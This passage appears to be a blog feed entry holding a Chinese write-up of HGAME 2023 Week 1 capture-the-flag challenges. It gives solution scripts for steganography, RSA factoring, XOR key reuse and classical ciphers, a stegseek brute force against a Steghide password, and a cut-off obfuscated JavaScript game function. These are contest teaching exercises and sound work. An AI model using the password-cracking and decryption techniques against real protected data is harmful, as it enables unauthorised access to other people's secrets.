<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2023-01-13T10:19:10.014Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HGAME 2023 Week 1</title>
    <link href="https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/"/>
    <id>https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/</id>
    <published>2023-01-11T10:51:02.000Z</published>
    <updated>2023-01-13T10:19:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 1</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><blockquote><p>欢迎参加HGAME2023,Base64解码这段Flag，然后和兔兔一起开始你的HGAME之旅吧，祝你玩的愉快！</p><p>aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==</p></blockquote><p>签到，base64解码，flag：<code>hgame&#123;Welcome_To_HGAME2023!&#125;</code>。</p><p>​    </p><h3 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h3><blockquote><p>兔兔回家之前去了一个神秘的地方，并拍了张照上传到网盘，你知道他去了哪里吗？</p><p>flag格式为: <code>hgame&#123;经度时_经度分_经度秒_东经(E)/西经(W)_纬度时_纬度分_纬度秒_南纬(S)/北纬(N)&#125;</code>，秒精确到小数点后两位</p><p>例如: 11°22’33.99’’E, 44°55’11.00’’S 表示为 hgame{11_22_3399_E_44_55_1100_S}</p></blockquote><p>wireshark打开流量文件，在TCP流15提取rar文件；</p><p>16进制下查看rar文件，查看第24个16进制数为<code>24</code>，修改为 <code>20</code> 去除伪加密，解压得到 <code>Exchangeable.jpg</code>；</p><p>查看jpg文件属性，发现GPS经纬度信息，提取经纬度数据按格式得到flag：<code>hgame&#123;116_24_1488_E_39_54_5418_N&#125;</code>。</p><p>​    </p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><blockquote><p>坐车回到家的兔兔听说ek1ng在HGAME的海报中隐藏了一个秘密……（还记得我们的Misc培训吗？</p></blockquote><p>zsteg查看png图片，发现在 <code>b1,rgb,lsb,xy</code> 存在lsb隐写内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sure enough, you still remember what we talked about at that time! This is part of the secret: `hgame&#123;U_Kn0w_LSB&amp;W`</span><br><span class="line">I put the rest of the content here, https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing, if you directly access the google drive cloud disk download in China, it will be very slow, you can try to use Scientific Internet access solves the problem of slow or inaccessible access to external network resources. This is my favorite music, there is another part of the secret in the music, I use Steghide to encrypt, the password is also the 6-digit password we agreed at the time, even if someone else finds out here, it should not be so easy to crack (( hope so</span><br></pre></td></tr></table></figure><p>得到flag前半部分 <code>hgame&#123;U_Kn0w_LSB&amp;W</code>。</p><p>到google云盘下载 <code>Bossanova.wav</code> 文件，根据上面文字提示 <code>I use Steghide to encrypt, the password is also the 6-digit password</code>，使用了 <code>Steghide</code> 工具用6位数字密码隐写信息，爆破密码提取信息：</p><p><code>stegseek Bossanova.wav rockyou.txt</code></p><p>解出密码为 <code>123456</code>，隐写内容：<code>恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！</code></p><p>flag：<code>hgame&#123;U_Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><p>​    </p><h3 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h3><blockquote><p>兔兔在抢票网站上看到了一则相亲广告，人还有点小帅，但这个图片似乎有点问题，好像是CRC校验不太正确？</p></blockquote><p>16进制下修改png图片的高为更大的值，发现flag：<code>hgame&#123;e99p1ant_want_a_girlfriend_qq_524306184&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><blockquote><p>兔兔刚买到车票就把车票丢到一旁，自己忙去了。结果再去找车票时发现原来的车票混在了其他东西里，而且票面还被污染了。你能帮兔兔找到它的车票吗。</p><p>注：flag.png已经提前保存在source文件夹下，并且命名为picture{x}.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeSourceImg</span>():</span></span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">source文件夹下面的图片生成过程：</span></span><br><span class="line"><span class="string">def makeImg():</span></span><br><span class="line"><span class="string">    colors = list(long_to_bytes(getrandbits(width * height * 23)).zfill(width * height * 24))</span></span><br><span class="line"><span class="string">    shuffle(colors)</span></span><br><span class="line"><span class="string">    colors = bytes(colors)</span></span><br><span class="line"><span class="string">    img = Image.new(&#x27;RGB&#x27;, (width, height))</span></span><br><span class="line"><span class="string">    x = 0</span></span><br><span class="line"><span class="string">    for i in range(height):</span></span><br><span class="line"><span class="string">        for j in range(width):</span></span><br><span class="line"><span class="string">            img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2]))</span></span><br><span class="line"><span class="string">            x += 3</span></span><br><span class="line"><span class="string">    return img</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(15):</span></span><br><span class="line"><span class="string">    im = makeImg()</span></span><br><span class="line"><span class="string">    im.save(f&quot;./source/picture&#123;i&#125;.png&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]</span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">shuffle(index)</span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure></blockquote><p>15张随机明文图片 $P_{m_k},k \in [1,15]$ 与1张flag图片 $P_f$，经过3张密钥图片  $P_k,k \in [1,3]$ 随机异或得到密文图片 $P_{c_k}, k \in [1,16]$，在随机生成明文图片的 <code>makeImg()</code> 函数中有概率生成像素为 (0,0,0) 的点，这些点在随机异或操作后，密文图片与密钥图片对应的该点像素值相同，则有：</p><p>flag图片对应的密文图片：$P_{c_f}(x,y) = P_{f}(x,y) \oplus P_{k_a}(x,y)$</p><p>非flag随机明文图片对应的密文图片： $P_{c_i}(x,y) = P_{m_i}(x,y) \oplus P_{k_b}(x,y)$，</p><p>当满足 $a=b$ 时，即找到使用相同密钥图片加密的两组原始图片，有 $P_{k_a}(x,y)=P_{k_b}(x,y)$，</p><p>则 $P_{c_f}(x,y) \oplus P_{c_i}(x,y) = P_{f}(x,y) \oplus P_{m_i}(x,y)$；</p><p>又有大部分随机明文图片的点的像素值为 (0,0,0)，即 $P_{m_i}(x_0,y_0)=0$，则</p><p>$P_{c_f}(x_0,y_0) \oplus P_{c_i}(x_0,y_0) = P_{f}(x_0,y_0) \oplus P_{m_i}(x_0,y_0)=P_{f}(x_0,y_0)$</p><p>有很大概率可以恢复flag图片。</p><p>只需找到满足 $a=b$ 的使用相同密钥图片加密的两组原始图片即可，通过爆破遍历。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">width = <span class="number">379</span></span><br><span class="line">height = <span class="number">234</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        img1 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img2 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img = xorImg(img1, img2)</span><br><span class="line">        img.save(<span class="string">f&#x27;out/img_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到还原的flag图片，flag：<code>hgame&#123;Oh_my_Ticket&#125;</code>。</p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>众所周知，RSA的安全性基于整数分解难题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ 分解出 $p,q$，常规RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Be-Stream"><a href="#Be-Stream" class="headerlink" title="Be Stream"></a>Be Stream</h3><blockquote><p>很喜欢李小龙先生的一句话”Be water my friend”，但是这条小溪的水好像太多了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stream</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (stream(i-<span class="number">2</span>)*<span class="number">7</span> + stream(i-<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>) % <span class="number">256</span></span><br><span class="line">    enc += <span class="built_in">bytes</span>([water ^ flag[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment"># b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>递推关系等同于矩阵运算：</p><p>$s_i=4s_{i-1}+7s_{i-2}\Longrightarrow \begin{bmatrix} s_i \\ s_{i-1}  \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}\begin{bmatrix} s_{i-1} \\ s_{i-2} \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}^{i-1}\begin{bmatrix} s_1 \\ s_0 \end{bmatrix}$</p><p>利用矩阵快速幂快速求值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">enc = <span class="built_in">list</span>(<span class="string">b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span>)</span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">s0, s1 = key</span><br><span class="line"></span><br><span class="line">M = matrix(Zmod(<span class="number">256</span>), [[<span class="number">4</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">A = vector(Zmod(<span class="number">256</span>), [s1,s0])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stream</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (M^(x-<span class="number">1</span>)*A)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>)</span><br><span class="line">    flag += [(<span class="built_in">int</span>(water) ^^ <span class="built_in">int</span>(enc[i])) % <span class="number">128</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><blockquote><p>学校突然放假了，tr0uble正在开开心心的收拾东西准备回家，但是手机铃声突然响起，tr0uble接起电话，但是只听到滴答滴答的声音。努力学习密码学的tr0uble一听就知道这是什么，于是马上记录下来并花了亿点时间成功破译了，但是怎么看这都不像是人能看懂的，还没等tr0uble反应过来，又一通电话打来，依然是滴答滴答的声音。tr0uble想到兔兔也在学习密码学，于是不负责任地把密文都交给了兔兔，兔兔收到密文后随便看了一眼就不屑地说”这么简单都不会？自己解去，别耽误我抢车票”。</p><p>flag为最后得到的结果套上hgame{}, flag中字母均为小写</p></blockquote><p>txt文件中有提示：</p><p><code>几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</code></p><p>从wav文件中手搓摩斯密码：</p><p><code>----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-.</code></p><p>解码：<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>根据txt提示，字符串逆序 + 栅栏密码（18栏） 得到：<code>rmocfhm_wo_ybipe2023_ril_hnajg_katfqqg</code></p><p>由 <code>2023</code> 猜测 <code>ybipe</code> 对应 <code>hgame</code>，尝试Vigenere密码，密钥 <code>vidar</code>，得到：<code>welcome_to_hgame2023_and_enjoy_hacking</code></p><p>flag：<code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><blockquote><p>兔兔最近迷上了一个纯前端实现的网页小游戏，但是好像有点难玩，快帮兔兔通关游戏！</p></blockquote><p>js游戏，查看源码，在 <code>/Res/Events.js</code> 中找到关键函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mota</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = [<span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span>];</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params">b, e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">g</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (--g) &#123;</span><br><span class="line">        b[<span class="string">&#x27;push&#x27;</span>](b[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    f(++e);</span><br><span class="line">  &#125;(a, <span class="number">0x198</span>));</span><br><span class="line">  <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span> (<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">&#x27;CFrzVf&#x27;</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> g;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span 